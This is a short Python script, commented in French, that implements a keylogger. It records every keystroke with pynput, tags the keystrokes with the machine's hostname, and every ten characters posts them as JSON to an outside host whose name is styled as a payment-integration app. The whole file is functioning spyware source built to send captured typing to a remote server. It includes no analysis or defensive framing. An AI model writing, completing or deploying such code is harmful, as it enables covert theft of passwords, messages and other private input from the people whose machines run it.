from pynput import keyboard
import requests
import json
import socket
from datetime import datetime
import threading

class Keylogger:
    def __init__(self):
        self.logs = ""
        self.machine_id = socket.gethostname()
        self.api_url = "paydunya-integration-mhvv.vercel.app"
        
    def on_press(self, key):
        try:
            # Capture les touches normales
            current_key = str(key.char)
        except AttributeError:
            # Capture les touches spéciales
            current_key = str(key)
            
        self.logs += current_key
        # Envoie les données tous les 10 caractères
        if len(self.logs) >= 10:
            self.send_logs()
            
    def send_logs(self):
        if not self.logs:
            return
            
        data = {
            "machine_id": self.machine_id,
            "timestamp": datetime.now().isoformat(),
            "keystrokes": self.logs.replace('\x03', '<CTRL-C>').replace('\x01', '<CTRL-A>')  # Nettoyage des caractères spéciaux
        }
        
        print(f"Tentative d'envoi des données: {data}")
        
        try:
            response = requests.post(
                self.api_url,
                json=data,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                }
            )
            if response.status_code == 200:
                self.logs = ""  # Réinitialise les logs après envoi réussi
        except Exception as e:
            print(f"Erreur d'envoi: {e}")
            
    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start() 